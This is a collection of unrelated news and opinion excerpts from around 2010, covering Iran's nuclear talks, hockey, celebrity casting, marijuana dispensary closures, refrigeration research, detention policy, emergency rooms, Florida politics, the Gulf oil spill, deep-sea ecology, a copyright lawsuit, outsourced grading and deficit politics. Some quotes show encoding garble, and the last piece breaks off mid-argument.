In an effort to stave off mounting pressure on its nuclear program , Iran announced Saturday it was positively considering proposals made by Brazil and Turkey on an uranium exchange scheme for civilian nuclear use , Army Radio reported .
In such a compromise , Iran 's low - level enriched uranium would be traded for nuclear fuel rods enriched abroad to levels enabling it to pursue civilian nuclear development only .
Iranian Foreign Ministry spokesman Ramin Mehmanparast reportedly said that " new formulas have been proposed to the [ nuclear ] fuel exchange , and I believe we can reach agreement over them .
" President Mahmoud Ahmadinejad agreed earlier this week to Brazilian mediation on the issue .
Iranian leaders previously rejected such proposals , with Supreme Leader Ayatollah Ali Khamenei saying that the West could not be trusted .
The Iranian move comes as the G5+1 nations prepare to submit a new proposal for sanctions on Iran to the UN Security Council next week , reported to be a diluted version of the measures Israel wants .
As the offseason continues , the Devils continue to face questions about their locker room .
Those questions continued Thursday , when Star - Ledger reporter Rich Chere reported that former Devil Brian Gionta believes the team struggles due to emotional and physical burnout .
The article , which deserves a read , further serves to wonder if the team ’s locker room chemistry is one issue keeping them from a deep playoff run .
Gionta , in taking with Chere , believed players were n’t fresh enough during the playoffs .
“ I think coming down to the end of the year some guys are burnt out with the grind of the season , ” Gionta said .
“ They need to do a better job of maybe balancing the regular season and making sure everybody is fresh enough come playoff time . ”
That statement seems odd , as former Devils coach Jacques Lemaire took time to rest everyone as the season wore down .
He even sat Jamie Langenbrunner , who was not happy with the situation .
Looking at the roster , there were several players with extensive workloads this season .
Five players skated in 80 + games , including Travis Zajac , who played every game this season .
Ten skaters played in 70 + games .
Martin Brodeur played in 77 games this season as well .
That ’s a lot of wear and tear on a players ’ body , when taking into account the amount of hits taken , shots blocked , etc .
But the reality is that these players need to play .
A guy like Zach Parise needs to be on the ice to give the team a chance to win night in and night out .
And when the Atlantic Division – and playoff seeding – can come down to one point , some guys will need to play everyday .
Not only that , but the Devils had several days off from practice , especially later in the season .
Many times , the team would hold optional skates or have team meetings .
Sometimes , the team would do off - ice workouts .
It seemed like the coaches tried to give players the days off needed to stay fresh .
I would n’t necessarily agree with Gionta , but maybe there are some things the team could do to improve the team morale late in the season .
But this next part of the article is one that seems a bit more truthful .
But Gionta still speaks to former teammates and he ’s heard all about the tensions between Devils players and management .
Word has gotten around the league about how poorly some respected veterans were treated , such as two - time Stanley Cup winner Jay Pandolfo being benched during the playoffs and forced to dress in the practice locker room instead of with his teammates in the main dressing room .
The Devils seemed to have significant locker room issues this year .
Langenbrunner and Lemaire never got along , with the captain believing Lemaire needed to handle some situations better .
Clearly , one of these situations was this new Jay Pandolfo situation .
Making a respected veteran dress in the practice locker room does n’t seem fair or right .
That would definitely earn Lemaire some enemies , and may explain why players stopped listening to the coach .
Read after the jump for the rest of my take on Gionta ’s comments !
So what does this all mean ?
Clearly , this is some more bad press for the Devils management .
It ’s not as if Gionta speaks from a completely blind point of view .
He played in the organization for seven years , playing for several different coaches during that time .
He also did n’t leave the organization with any bad feelings or burned bridges .
It seems like he may know something that ’s happening with the players .
And , clearly , management is failing somewhere .
It seems the biggest rub with the players was the Pandolfo situation , which I do n’t agree with either .
When you have a respected , two - time Cup winning champion , you do n’t make him change in a practice locker room , even if he ’s not going to dress for the game .
It ’s a positive , team - first guy like that the team needs in its locker room .
Making that decision could definitely anger the players .
There will be changes made , especially with a new coach taking the reins next season .
With everything coming out through the media , one of the biggest changes needed seems to be better communication between the players and coaches .
If the team can work out this glaring problem , then maybe it will alleviate some of the tension in the locker room .
And maybe that will take care of some of these issues of “ burnout ” the players are experiencing .

The Internet has been abuzz with the rumor that Lindsay Lohan , amid all her trouble , has landed her next acting gig , playing ' 70's porn star Linda Lovelace in the independent period drama " Inferno . "
Like so many Lohan rumors , it 's been tricky to separate fact from myth , but late Monday we talked to one of the producers , and he confirmed that Lohan will star in the film .
" Inferno " producer Wali Razaqi told us that Lohan has indeed been cast and that an announcement will be made ( no doubt for the benefit of the foreign distributors whose money partly finances such productions ) at the upcoming Cannes Film Festival .
Lohan may appear at the festival as part of that announcement , though we 'll believe that part when we see it .
" We 've all thought that Lindsay would be a great choice for a while now , and we 're all convinced that she is going to do it , " Razaqi said .
" For at least a year , the director [ Matthew Wilder ] and I have gone back and forth imagining how awesome of a performance she could give if she was in the movie . "
As far as what Lohan will actually be doing in the film , the producer was less forthcoming .
He did disclose that Bill Pullman is attached to play Hugh Hefner in the movie , which will be based on the real events of Lovelace 's life .
The drama will delve into " the difficult stuff she went through and overcame , " he said .
" I would say it 's probably one of the most challenging roles any actor could play -- and not because of the sexual content , necessarily -- but more because she was so battered and beat up emotionally , that I think it ’s gonna take everything Lindsay has to really be able to pull it off , " he said .
" Not that Lindsay 's life is similar in any way -- but she 's been through a lot of ups and downs .
A lot of times you 're loved and then you 're hated , and I think she can relate to those emotions and feelings .
One week she 's the ' it ' girl , and the next , she 's the ' what are you doing ? ' girl . "
Lohan has been raising eyebrows as of late as she 's stayed out all night partying at Hollywood clubs .
Her father , Michael Lohan , has made a public plea for his daughter to get help for what he claims is a serious drug problem .
But the antics do n't worry Razaqi .
" I 'll tell you this , " he said , " if her behavior were a serious concern , I do n't think we would have been going after her the way we did . "

The Los Angeles City Attorney 's office on Tuesday released a list of 439 marijuana dispensaries that have been ordered to shut their doors after a new city council ordinance went into effect beginning this week .
[ Updated at 6:06 p.m. :
The Times has previously published maps of dispensaries ordered to close and dispensaries allowed to operate . ]
City prosecutors reported Monday that most of the collectives had complied with orders to shutter their businesses and said they would take a wait - and - see attitude
Holdouts face civil penalties of $ 2,500 a day and up to six months in Los Angeles County jail .
The remaining dispensaries have until Monday to file paperwork showing their intent to comply with the new local restrictions .
The City Attorney 's office said it will wait to see if any of the medical marijuana establishments stay open in violation of the law and said it might take enforcement action against those that flout the law .
The 21st Century Iceman Cometh , Toting Sustainable Refrigerant
April 18th , 2010 by Tina Casey
Scientists in Spain and Germany are working on a new material that could set the refrigeration industry back 80 years – in a good way , that is .
As reported by Science Daily , instead of fluorinated gasses the new material is a solid , like the familiar old blocks of ice from a bygone era only in a high tech form for the sustainable new millenium .
[ social_buttons ]
The push to find alternatives to fluorinated gasses ( HFCs ) is urgent , because they have been identified as a group of particularly powerful and long lasting greenhouse gasses that contribute to global warming .
Mechanical refrigeration will enter more households as the world ’s population grows and more regions adopt modern technology , so the potential market for a non-polluting alternative to HFC ’s is enormous .
HFCs and the Road to Hell
HFC ’s provide a classic illustration of the law of unintended consequences — as in , the road to hell is paved with good intentions .
HFC ’s were introduced about twenty years ago in order to wean the refrigeration industry away from other gasses ( CFCs ) that were putting holes in the Earth ’s protective ozone layer .
But what worked for the ozone is proving not so good in terms of greenhouse gas emissions and global warming .
The Road to Sustainable , Solid Refrigerants
The new refrigerant material is based on the principles of hydrostatic pressure ( hydrostatic refers to the properties of fluid at rest , and hydrostatic pressure refers to the force of gravity exerted by a fluid ) , in combination with a magnetocaloric effect in which certain materials change temperature when exposed to a magnetic field .
Initially that effect was thought to produce only an increase in temperature , but more recently it has been found that a decrease in temperature is also possible .
The researchers found that they could achieve a rather impressive magnetocaloric effect by applying a relatively small amount of hydrostatic pressure to a nickel - manganese - indium alloy .
Magnets and Sustainability
The possibility of a solid , non -toxic alternative refrigerant is yet another example of the growing role that magnetic fields are playing in the sustainable future .
Just a couple of other examples are the development of a magnet - based solder that replaces toxic lead solder , and new research into tiny nanomagnets that could make computers more energy efficient .

Latest Cleantech Talk Episode
Elena Kagan , President Obama ’s selection for the next Associate Justice of the Supreme Court , says she supports holding terror suspects without trial — indefinitely , in some cases .
Questioned as to whether she ’d support the detention of al Qaeda suspects without access to US laws — or even a trial to prove their guilt — Kagan told Sen. Lindsey Graham ( R - SC ) last year she backed the Obama Administration ’s policy of “ indefinite detention . ”
ADVERTISEMENT
Graham asked Kagan whether she ’d apply battlefield law instead of criminal law if a suspect were believed to be financing al Qaeda .
“ I do , ” Kagan said .
Under military law , Graham noted that prisoners can be held without trial in an effort to keep them from returning to the “ battlefield . ”
Kagan ’s response went farther than previous Administrations ’ claims ; she maintained that the battlefield can apply to terror suspects caught outside traditional war zones ( agreeing with Graham , for example , that an alleged al Qaeda financier detained in the Philippines would not be granted access to US laws ) .
Both President Obama and former President George W. Bush have backed holding some suspected terror combatants without trial .
In the case of Guantanamo Bay detainees , the Obama Administration has said they would hold prisoners without trial in some cases because the evidence against them has been tainted by suspects ’ harsh treatment at the hands of their US jailers and would be inadmissible in a trial .
ADVERTISEMENT
Kagan ’s comments on indefinite detention seem to have new relevance after comments Sunday by Attorney General Eric Holder , in which he declared that even US citizens do n’t need to be read their rights if they ’re suspected of being involved in terrorism .
Ã¢â‚ ¬Å“ If we are going to have a system that is capable of dealing , in a public safety context , with this new threat , Ã¢â‚ ¬Â Holder said on ABC’s This Week Sunday .
Ã¢â‚ ¬Å“ I think we have to give serious consideration to at least modifying that public safety exception .
Ã¢â‚¬Â
Modifying that exception , Holder said , is Ã¢â‚ ¬Å “ one of the things that I think weÃ¢â‚¬â „ ¢re going to be reaching out to Congress to do Ã¢â‚¬â€œ to come up with a proposal that is both Constitutional , but that is also relevant to our time and the threat that we now face .
Ã¢â‚¬Â 
ADVERTISEMENT
Holder said that the U.S. needs to examine whether the current rules regarding Miranda warnings give law enforcement agents the Ã¢â‚ ¬Å “ necessary flexibilityÃ¢â‚
¬
Â when dealing with terrorism cases .
The Miranda warning requires law enforcement officials to inform suspects of their rights , including the right to remain silent .
Conservatives have attacked the Obama administration for informing suspects of their right to remain silent because they believe it is antithetical to collecting valuable intelligence during situations in which lives may be at stake .

Holder ’s comments come on the heels of a failed plot to detonate a Nissan Pathfinder in Times Square .
WASHINGTON ( Reuters ) -
One in five people in the United States visit an emergency room every year , and most of them have health insurance of some kind , according to a U.S. government survey released on Wednesday .

The survey contradicts a common perception that emergency rooms are packed with uninsured people and illegal immigrants .
It also rejects some claims that people are using the emergency department for routine care -- just 10 percent of visits were for non-urgent causes .
“ In 2007 , approximately one in five persons in the U.S. population had one or more emergency department visits in a 12 - month period , ” the report from the National Center for Health Statistics reads .
“ Among the under - 65 population , the uninsured were no more likely than the insured to have had at least one emergency department visit in a 12 - month period . ”
Tamyra Carroll Garcia and colleagues at the center used two large national surveys of healthcare use in 2007 for their study .
“ Since 1996 , demand for emergency services in the United States has been rising , ” they wrote .
“ While the number of emergency departments ( EDs ) across the country has decreased , the number of ED visits has increased .
As a result , EDs are experiencing higher patient volume and overcrowding , and patients seeking care are experiencing longer wait times , ” they added .
“ As national health care costs continue to rise and policymakers become increasingly interested in ways to make the health care system more efficient , it is important to understand the characteristics of those individuals who use EDs -- often in place of other sources of ambulatory care . ”
They found that the more income people had , the less likely they were to ever visit an emergency room .
People over 75 and blacks were the most likely to visit emergency rooms .
The American College of Emergency Physicians published a survey this month showing that 61 percent of emergency doctors surveyed believe U.S. healthcare reform will send even more people to emergency departments .
Only 1 percent of the 1,800 doctors surveyed thought visits would decrease .
And 47 percent said the reforms signed into law in March would worsen overcrowding in emergency rooms .
“ It ’s important to note the report finds that having a usual source of medical care , such as a primary care provider , does not affect the number of times people under age 65 visit the emergency department , ” Dr. Angela Gardner , president of the American College of Emergency Physicians , said of Wednesday ’s report .

Ah , Florida !
Where recounts do n’t count ; where even school boards are corrupt ; where holy water is a weapon ; where kids of pols are all black sheep or dark horses .
It ’s a political playground down there , but beyond the loud bullies , this playground ’s got a fair share of quiet , devious , nerdy geniuses .
Which makes the latest allegations by Florida GOP chairman and state Sen.
John Thrasher slightly plausible .
His charge : Lefties have pulled an “ Alvin Greene ” in the Sunshine State .
According to the estimable St. Pete Times :
Republicans see a conspiracy theory : a number of the tea party candidates are former Democrats , some appear financially strapped to pay the $ 1,800 filing and others are filing to run in districts far away from their listed address .
A number of the seats are also targeted by Democrats for takeover .
“ The recent flurry of last minute filings by so–called ‘ tea party candidates ’ looks awfully suspicious , ” said GOP Chairman John Thrasher in a statement .
“ While a few tea - party candidates across the state do have ties to the tea party movement , in the majority of instances , it appears that the Democrats have coordinated a dishonest attempt to hide phony candidates behind the name “ tea party ” and to confuse voters who may be supportive of the tea party movement , effectively stealing votes from true conservative candidates and injuring the grassroots tea party movement as a whole . ”
Apparently , all this is being coordinated by one Fred O’Neal , an Orlando attorney ( and registered Democrat ) who last year created the “ Tea Party of Florida ” as an actual political party , much to the dismay of some more ardent patriot activists .
There are whispered rumors of a link between O’Neal and firebrand Democratic Rep. Alan Grayson , he of Rachel Maddow fame .
One thing ’s for sure , they share a burning hatred of old - line Republicans , as this letter from O’Neal to a GOP candidate attests :
Republican politicians , in my experience , tend to vote the way their “ masters ” tell them to vote , rather than in the best interest of the people …
If you think “ trickle down economics ” and representing special interests is best for the country , then you have a right to say so and you have a right to run for office in a political party which generally agrees with your philosophy .
I , on the other hand , disagree .
I think the American people have been “ trickled on ” enough .
Whew !
It ’s hard to say what the impact of O’Neal ’s recruited Tea Party candidates will be .
But this has always been the big risk underlying the Republican Party ’s delicate courtship of the angry patriot movement : Grassroots libertarians by nature are n’t big joiners , so it ’s hard to claim their support without driving them out of your camp .
The state Democratic Party , of course , poo-poos any allegations that these Tea Partiers are their plants .
“ Despite their beliefs , the black helicopters are not coming to get John Thrasher , ” party spokesman Eric Jotkoff told the Times .
“ Maybe they should spend more time cleaning up their party . ”
LONDON ( Reuters ) -
It might have been better for the environment to have done nothing about the enormous oil spill in the Gulf of Mexico except to keep the oil out at sea , British scientists said on Monday .
Marine biology and environmental experts said they feared the aggressive cleanup operation , during which oil has been set alight and oil - dispersing chemicals have been dumped into the sea , might be more damaging than the oil itself .
Previous experience suggests that containing the oil out at sea but otherwise leaving it alone to disperse and evaporate naturally is better in the long run but is regarded as politically unacceptable , they said .
“ One of the problems with this spill is that it has gone from the environmental arena into the economic and political arena , so if you ask how bad it is , that depends on which perspective you ’re coming from , ” said Martin Preston , an expert in marine pollution , earth and ocean sciences from Britain ’s Liverpool University .
“ Economically , clearly the impact has been very large , but environmentally the jury is still out .
One of the tensions between environment and politics is that politicians cannot be seen to be doing nothing , even though doing nothing is sometimes the best option . ”
Scientists told the briefing in London that although the Deepwater Horizon rig blowout and explosion , the death of 11 workers and the leak added up to a major incident , they did not yet constitute an environmental catastrophe .
The U.S. government estimates that up to 60,000 barrels ( 2.5 million gallons / 9.5 million litres ) of oil a day are spewing from the damaged BP Plc oil well on the seabed about a mile below the surface .
Much of the oil is still far out at sea , but some is starting to drift toward the southern U.S. coast , where Louisiana ’s fragile wetlands have been hardest hit so far .
BP and the Obama administration have been under pressure from the public to take serious action to clean up the oil .
Opinion polls have shown that the U.S. public disapproved of BP ’s response to the spill and grew more skeptical about the Obama administration ’s response in the weeks after the accident .
The spreading oil has halted major fisheries and covered wetlands and beaches from Louisiana to Florida .
The public has been horrified by images of birds and other wildlife soaked in oil .
“ LEAVE WELL ALONE ”
There have been around 20 major spills of more than 20 million gallons since the 1960s .
The largest recent spill was in 1991 in the Gulf as a result of the Gulf War when between 240 and 460 million gallons were spilled .
The largest previous spill resulting from a rig blowout like that of the Deepwater Horizon was the Ixtoc 1 off Mexico ’s Gulf coast in June 1979 , which continued for 9 months during which more than 140 million gallons of oil was spilled .
The Exxon Valdez accident in Alaska in 1989 spilled around 10 million gallons .
Simon Boxall , an expert at Britain ’s National Oceanography Center who has helped analyze various major oil spill cleanups , said several detailed experiments had been conducted since the Exxon Valdez spill , looking at areas that were left alone , as well as at areas cleaned up chemically or mechanically .
“ The chemically cleaned up areas have taken the longest to recover and they are still damaged , ” Boxall said .
“ The areas that were left alone actually recovered much quicker . ”
Some 10,000 people were flown in to deal with the Exxon Valdez spill , and Boxall said scientists now wondered whether the “ cleanup town ” that grew up around it caused more environmental damage than the oil itself .
Christoph Gertler of Bangor University , who has been studying various potential bacterial remedies for oil spills , said reports by the U.S. National Oceanic and Atmospheric Administration suggested that dispersants were “ changing the nature of the oil in a very unfavorable way , ” making it more difficult for naturally occurring marine bacteria to break it down .
Boxall said it was important to remember that oil coming from the BP well was a light crude that would break down and evaporate fairly quickly when it came to the surface .
He said there were three golden rules of oil spills :
“ The first is do n’t spill it in the first place : the second is , if you do spill it , try and pick it up as quickly and easily as possible , ” he said .
“ And the third is that in the open ocean , the best thing to do is leave well alone .
Unfortunately , politically that always looks like a cop-out . ”
Scientists agreed that the wetlands of Louisiana were the most sensitive areas at risk , but said that here again a light touch might be the safest solution .
“ The more delicate an area is -- and many of these areas around the Gulf coast are very delicate -- the more significant is the risk of making things worse by acting , ” said Preston .
“ A rather gung - ho attitude to the cleanup could end up doing more damage than if it had simply been left alone . ”

Once used as deadly weapons , to slash enemies apart , Japanese Katana swords are now used by Japanese white - collar women to slash away extra pounds and cut down stress .
The recently opened “ Samurai Camp ” gym , in Tokyo , looks more like the training ground for modern amazons .
More than 100 of them have signed up for this unusual fitness program that aims to help them lose 11 pounds in just one month .
The inventor of samurai sword fitness , 31 - year - old Takafuji Ukon , believed men would be more interested in the art of Katana wielding , but much to his surprise , women were the ones who flocked to the gym .
Ukon is not a martial arts expert , but he is a master of sword dancing , and knows just what moves to teach , so the women can shed the extra weight .
Still , in order to avoid potentially deadly accidents , real swords were replaced with wooden ones , wrapped in tin foil .
Since we do n’t live in an era where slashing people is allowed , Takafuji Ukon teaches his students to visualize fat and stress as the enemies , when they ’re using the swords .
And according to the clients of Samurai Camp , they appreciate the chance to get in touch with Japanese culture , relax , and lose weight , all at the same time .

Even in the dark abyss of the deep ocean animal communities can undergo rapid , widespread and radical changes .
Scientists at the National Oceanography Centre are at the forefront of monitoring these changes and understanding the mechanisms responsible .
Their latest research is published in a special issue of the journal Deep Sea Research II .
We often think of the deep ocean floor as stable , relatively unvarying environment untroubled by surface climate conditions .
But long - term monitoring has shown that animal communities living at great depth on the seafloor can change radically over remarkably short periods , and that these events are ultimately driven by climate .
Such faunal changes are exemplified by the ' Amperima Event ' - the sudden mass occurrence of the sea cucumber ( holothurian ) Amperima rosea recorded on the Porcupine Abyssal Plain ( PAP ) situated off the southwest coast of Ireland in the northeast Atlantic .
Communities of animals living on the seabed there at depths of nearly 5000 metres have been monitored from 1989 to the present day .
A major change occurred in the PAP community between 1996 and 1999 involving a number of animal groups , including sea anemones , segmented worms , sea spiders , sea squirts , brittle stars , and sea cucumbers , all of which increased in abundance .
However , the population explosion in the sea cucumber Amperima rosea ( hereafter Amperima ) was particularly striking - thus the ' Amperima Event ' .
Before 1996 the sea cucumber was found in only ones or twos .
They were very rare .
But by 1999 , the sea cucumber reached such high densities that if you were able to walk on the deep seafloor , you would have difficulty in avoiding squashing them flat .
Dr David Billet and his colleagues showed that the increase abundance and dominance of Amperima occurred over a very wide area , greater than the size of the UK .
Changes are also apparent in the abundance of other animals living in the seabed , including the single - celled creatures inhabiting the sediments .
The whole deep - sea world had been turned on its head .
advertisement
" What this strongly suggested , " says Dr Billett , " is that the ' Amperima Event ' did not simply reflect localised , chance changes in the abundances of one or two species .
Instead , changes in the whole deep - sea animal community were driven by environmental factors . "
The animals living on the deep seafloor feed on organic matter in the form of phytodetritus - the remains of tiny marine plants that once lived in the sunlit surface layer - and which fall down through the water column and settle on the seabed .
It seemed possible that an increase in the amount of this ' marine snow ' might have driven the ' Amperima Event ' .
From sediment trap measurements , a team led by Professor Richard Lampitt of the National Oceanography Centre has subsequently shown that variations in the supply of organic matter to the PAP can vary greatly between years .
Indeed , a second sudden mass occurrence of Amperima in 2001 - a possible second ' Amperima Event ' - may have been due to increased food availability .
Food quality may also be important .
Dr Denise Smythe - Wright , also of the National Oceanography Centre and her colleagues have shown that the composition and potential nutrient quality of organic matter exported from the surface ocean depend on the species composition of the ocean phytoplankton community .
This could favour the reproduction , recruitment and competitive ability of particular species .
For example , Amperima has a different requirement for certain carotenoid pigments than other species of sea cucumber .
Carotenoids in shallow water are known to improve egg production and improve the chances of larvae in developing into juveniles .
Carotenoids are used as feed in aquaculture to improve yields .
In the food - limited deep sea , changes in the quantity and quality of the downward flux of carotenoids with season and year may change the egg production in certain species allowing the rapid colonisation of large areas of the seafloor when the conditions are right .
" Whether it is the quality or the quality of the organic matter , or both , that matter , " says Dr Billett , " it appears that changes in the density of animals such as Amperima are related to phytoplankton productivity in the overlying surface waters , which is affected by climate change . "
" Moreover , " he says , " we know from the fossil record that deep - sea animal communities change over geological timescales .
Knowing how species density and dominance change in relation to environmental variables in the present will help in interpreting the geological record and will allow predictions of how deep - sea fauna might alter in relation to climate change . "
* Dow Jones says Briefing.com gets “ free ride ”
* News Corp ’s Murdoch champions paid online content ( Adds Bloomberg comment , Murdoch views )
NEW YORK , April 20 ( Reuters ) - Dow Jones &
Co sued the financial news service Briefing .com Inc on Tuesday , accusing it of getting a “ free ride ” by systematically misappropriating news and headlines for its website , often in near real - time .
The lawsuit , filed in Manhattan federal court comes one month after another judge in the same courthouse issued an injunction banning Theflyonthewall.com from quickly publishing research from Bank of America Corp 's BAC.N Merrill Lynch unit , Barclays Plc BARC.L and Morgan Stanley MS.N .
“ Briefing.com has brazenly taken a free ride , ” Dow Jones general counsel Mark Jackson said in a statement .
“ Briefing.com did not use its own resources to uncover , verify and describe news events .
It waited for Dow Jones to do all the work , and then simply copied the content . ”
Dow Jones , a unit of Rupert Murdoch 's News Corp NWSA.O , is seeking a permanent injunction against copyright infringement , the deletion of copyrighted materials from Briefing .
com 's database , compensatory and punitive damages .
Briefing.com , based in Chicago , did not return requests for comment .
The copyright lawsuit is the latest battle among financial news providers over the alleged misappropriation of “ hot news ” and whether it infringes copyright law or the media ’s ability to publish under the First Amendment .
Such information , whether in the form of breaking news or analyst research , regularly causes stocks to move .
The lawsuit also comes amid growing competition for revenue among news providers , as Wall Street tries to pare costs in the wake of the 2008 financial crisis .
Murdoch has championed paid - for online news , saying Google Inc GOOG.O has cost the industry revenue by making news available for free .
According to its website , Briefing.com offers some services for free and others for $ 40 a month or more .
Founder and Chairman Dick Green created Briefing.com in 1992 and the company employs more than 60 people , the website says .
“ JOURNALISTIC EFFORT ” WANTING
In its lawsuit , Dow Jones contended that Briefing .com regularly and without permission republishes its news , often verbatim .
As an example , it said that from Jan. 29 to Feb. 12 , 2010 , Briefing.com copied 72 headlines and a “ substantial portion ” of at least 107 articles within a few minutes of their initial appearance on Dow Jones Newswires , without permission or any “ journalistic effort ” on its own part .
Dow Jones said it is “ unaware ” how Briefing .com obtains Dow Jones news , but said it is likely liable for either breach of contract or unauthorized interference if it gets news from Dow Jones subscribers so it can distribute it on its own .
Thomson Reuters Corp TRI .
TOTRI.N , Bloomberg LP and other providers compete with Dow Jones in providing real - time news .
Thomson Reuters spokeswoman Erin Kurtz and Bloomberg spokeswoman Judith Czelusniak declined comment .
In her March 18 ruling against Theflyonthewall.com , U.S. District Judge Denise Cote ordered the company to wait until 10 a.m. to report research from Bank of America - Merrill Lynch , Barclays and Morgan Stanley issued before the market opens and at least two hours for research issued thereafter .
She said this gave the providers , in this case the Wall Street banks , time to get news first to their clients , “ while still recognizing the inevitable , fast - moving , and widespread informal communication of recommendations on Wall Street . ”
Theflyonthewall.com asked Cote to put the injunction on hold , saying it caused some subscription cancellations and could threaten its survival .
The banks argued against the move , saying “ reduced subscription revenue is not tantamount to irreparable harm . ”

A veteran university professor frustrated with the tedium and time of grading papers has created a company that outsources the job to India .
With a dozen clients in academia and a thick skin , Dr. Chandru Rajam is prepared to weather the outrage EduMetry Inc. of Herndon , Va. , has set off .
Virtual - TA , which hires offshore university - educated staff to assess , grade and comment on student assignments , is only one of the EduMetry services .
But it is by far the most controversial .
“ Our intent is not to cheapen or degrade the learning and teaching equation , ” Rajam told the Star .
“ We think there is a better model .
We never outsource the responsibility , we ’re just outsourcing the activity .
“ I like to half - jokingly point out that a mother is outsourcing childcare to a daycare provider .
If you can entrust the care of your infant to a third person , any form of outsourcing should be fair game . ”
Since it was created five years ago , EduMetry has assembled a team of adjunct professors , retired teachers , “ homemakers with masters ’ degrees ” and other university - educated staff , most in India but some in Singapore and Malaysia , to grade 2,000 student assignments a week .
A selling point , said Rajam , is the extensive comments that accompany each grade – something graduate assistants and professors can seldom supply .
A professor at George Washington University , Rajam understands the wary response so far .
“ The vast majority of the comments tend to be negative .
We knew what we were in for at Day One .
Nor do we claim our service is for everyone .
If the student - teacher ratio is very manageable , such an institution has no need for our services .
But there are a variety of higher education contexts , so I think there is a role for us . ”
Among students , he said , “ any apprehension at first blush goes away when they see the quality of the feedback . ”
“ Everyone who has ever had a college degree knows what it ’s like to just get ‘ good ’ written in the margin and wonder what it means , ” said Terri Friel , dean of the business school at Roosevelt University in Chicago .
“ This gives students a great deal more guidence . ”
Friel used Virtual - TA at her previous university , Butler in Indianapolis .
At Roosevelt , she has used one of EduMetry ’s other programs .
“ I consider Chandru a brilliant business man .
His company offers something really unique . ”
Virtual - TA graders are trained to compile reports for professors that point out overall problems as well as specific student errors , she said .
“ They can say , ‘ Your students are n’t getting this concept . ’
It ’s a very nice system . ”
A western Canadian college or university is among EduMetry ’s dozen clients , but Rajam declined to identify it .
The University of Houston director of business law and ethics , Lori Whisenant , is a client , as are professors at the University of Northern Iowa College of Business Administration , West Hills Community College in Coalinga , Calif . and George Washington .
Whisenant ’s seven teaching assistants had to wade through papers from 1,000 students each year .
“ Our graders were great but they were not experts in providing feedback , ” Whienant told The Chronicle of Higher Education about her teaching assistants .
With Virtual - TA , “ we ’re working with professionals . ”
Prices vary per course , but Virtual - TA estimates the program costs a university about $ 12 per student per assignment .
Six assignments for 20 students would cost $ 1,440 .
EduMetry graders receive from $ 500 to $ 1,000 a month , depending on hours worked , according to GlobalPost , a news service .
EduMetry has developed a checklist for each professor that begins several weeks before a semester with a briefing on course content , the professor ’s style and expectations , said Rajam .
A grader will typically send an early run of papers back to a professor to see if the work is handled according to plan .
“ As a business school professor , what I find is there are double standards , ” said Rajam .
“ As long as outsourcing meant for the last 30 years only the flight of blue - collar jobs , that was okay .
The moment it extends to knowledge work , immediately people get defensive .
The idea that EduMetry ca n’t mark an English Composition 101 paper is ludicrous . ”
Indeed , an article by the Chronicle on EduMetry generated nearly 100 comments , many angry that their work was devalued .

“ This is race - to - the - bottom economic rationalism , ” wrote Raymond J. Ritchie .
Students “ are paying big tuition fees for an education in a Western country and they get marked by a call - in - centre in India !
This idea is so cheap and nasty . ”
“ I do n’t want to come across as disrespectful or painting with a large brush , ” said Rajam .
“ The members of the academic profession who seem to have the greatest difficulty are not as cognizant of what ’s going in the global economy .
They are people who do n’t have a deep understanding of the world today . ”
Said Friel : “ I also think grading is a very low level way of teaching .
It ’s not the best use of the brain power and talent of your professors .
But this does n’t mean you ca n’t go and read a student ’s paper .
I take exception to the people who think this takes everything away from them . ”

Canadian socialists David Camfield and Daniel Serge look at one of the main arguments for " cutting deficits " -- and explain why working people have to resist .
DEFICITS ARE the difference between what governments spend and what they take in .
Governments often claim deficits are the fault of social spending that 's too high .
But in fact , deficits always grow when capitalist economic activity slows down or contracts , because tax revenue falls while state spending rises .
The global economic crisis that began in 2008 has caused deficits to grow .
States have had to commit around $ 20 trillion to prevent a meltdown of the international banking system and " stimulate " the economy .
This has staved off an economic collapse like the Great Depression of the 1930s , but it 's led to big deficits and growing debt .
In the Canadian state , federal and provincial deficits have risen , but the federal deficit is , in fact , much smaller relative to the level of economic activity than in any other country of the G - 7 ( the U.S. , the UK , France , Germany , Italy , Japan and Canada ) .
Are n't growing deficits a problem we all have to be concerned about ?
No .
Big deficits are a problem for the ruling class , but working people should n't shoulder any responsibility for solving their problem .
When a country 's deficit is large , the cost of financing state debt by issuing bonds often goes up , since the government has to offer higher interest rates on bonds in order to attract buyers .
Speculation on currency markets can also lead to a fall in the value of the country 's currency .
Big deficits often lead to higher inflation .
This eats into the value of interest income , which is bad news for bankers and other ultra-rich people who own lots of interest - paying assets .
Capitalists fear that higher inflation will lead workers to demand higher wages to maintain the value of their wages .
Higher levels of inflation also allow less - competitive firms to take advantage of the fluctuating prices of inputs and outputs .
These firms can then survive without investing in the newest technology and ways of organizing work .
These are problems for capitalists , governments and top civil servants trying to steer a country 's economy on the stormy seas of global capitalism ( an impossible challenge , since the global capitalist economy is beyond the ability of any state to control ) .
When ordinary people accept the idea that the deficit is our problem , too , it leads to support for the " solutions " proposed by capitalists and pro-capitalist political parties : cuts to spending on education , health care , social assistance and other government programs , along with privatization and higher college and university tuition and other user fees .
We 've seen what this means :
In the mid-1990s , the Liberal federal government headed by Jean Chretien cut 45,000 jobs , privatized CN Rail and Petro Canada , slashed funding to the provinces for social programs and weakened unemployment insurance , all in the name of lowering the deficit .
If either Stephen Harper 's Tories or Michael Ignatieff 's Liberals had a majority government , we could well see another massive round of cuts .
Some European governments are starting to implement big cuts in the name of deficit reduction .
Is the deficit just a scam ?
Some on the left who rightly reject the idea that the deficit is everyone 's problem and therefore spending cuts are needed , argue that the deficit is n't really a problem for anyone .
They say deficit cutting is just a scam made up by right - wing ideologues to justify the harmful policies they want to inflict on us .
Is this true ?
Another way of putting it would be to ask does capitalism ever go into real crisis ?
According to mainstream economists , the answer is No. Capitalism represents the purest expression of human nature - - rational self - interest -- and the market is a self - regulating mechanism to express it .
When crises do occur , they 're because of too much government interference -- for instance , spending on social programs .
Or they occur according to a natural business cycle that no one can really do anything about .
Further to the left , social democrats say that yes , capitalism does go into crisis and governments can have real problems paying off their debts .
But it 's not terminal : the supply and demand of labor and goods can be regulated by government spending .
This is called Keynesianism , and right - wing governments across the world rediscovered Keynesianism in 2008 , when the banks came begging , cap in hand .
Give money to the banks , and they could write off all their bad loans ; newly solvent again , they 'd start lending money , which would kick - start the economy .
We know how this worked : financial institutions have returned to their predatory ways , there 's been a fragile recovery , governments have spent all their rainy - day funds , and trillions of dollars of toxic debt are still being kicked around from lender to lender , waiting for someone to fumble .
Some left - wing Keynesians have said that the problem was n't stimulus itself , but that it was given to the banks .
